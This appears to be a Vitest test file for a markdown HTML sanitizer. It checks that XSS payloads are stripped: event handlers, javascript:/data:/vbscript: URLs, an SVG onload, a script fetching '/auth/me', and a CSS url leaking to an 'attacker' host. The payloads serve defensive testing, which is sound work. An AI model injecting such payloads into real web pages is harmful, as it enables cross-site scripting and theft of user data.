// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { escapePlainText, sanitizeMarkdownHtml } from './sanitize'

describe('sanitizeMarkdownHtml', () => {
  it('removes executable attributes and unsafe URL protocols', () => {
    const html = '<img src="x" onerror="alert(1)"><a href="javascript:alert(2)">open</a>'
    const clean = sanitizeMarkdownHtml(html)

    expect(clean).not.toContain('onerror')
    expect(clean).not.toContain('javascript:')
    expect(clean).toContain('open')
  })

  it('keeps ordinary documentation markup', () => {
    const clean = sanitizeMarkdownHtml('<h2>配置</h2><pre><code>display version</code></pre>')

    expect(clean).toContain('<h2>配置</h2>')
    expect(clean).toContain('display version')
  })

  it('strips script tags entirely (stored XSS vector)', () => {
    const clean = sanitizeMarkdownHtml(
      '<p>safe</p><script>fetch("/auth/me").then(r=>r.json()).then(j=>{/*steal*/})</script>',
    )
    expect(clean).not.toContain('<script')
    expect(clean).not.toContain('fetch(')
    expect(clean).toContain('safe')
  })

  it('strips event handlers regardless of casing', () => {
    const clean = sanitizeMarkdownHtml('<img src="x" OnLoAd="alert(1)">')
    expect(clean.toLowerCase()).not.toContain('onload')
  })

  it('rejects data: and vbscript: URLs', () => {
    const clean = sanitizeMarkdownHtml(
      '<a href="data:text/html,<script>alert(1)</script>">d</a>' +
        '<a href="vbscript:msgbox(1)">v</a>',
    )
    expect(clean).not.toContain('data:text/html')
    expect(clean).not.toContain('vbscript:')
  })

  it('strips SVG entirely (svg-onload XSS vector)', () => {
    const clean = sanitizeMarkdownHtml('<svg onload="alert(1)"><circle r="5"/></svg>')
    expect(clean).not.toContain('svg')
    expect(clean).not.toContain('onload')
  })

  it('strips style attribute (CSS keylogging vector)', () => {
    const clean = sanitizeMarkdownHtml('<div style="background:url(http://attacker/?leak)">x</div>')
    expect(clean).not.toContain('background:url')
    expect(clean).not.toContain('style=')
  })
})

describe('escapePlainText', () => {
  it('returns text with HTML special chars encoded', () => {
    const out = escapePlainText('<script>alert("x")</script> & "quoted"')
    expect(out).not.toContain('<script')
    expect(out).toContain('&lt;script')
    expect(out).toContain('&amp;')
    expect(out).toContain('&quot;')
  })
})
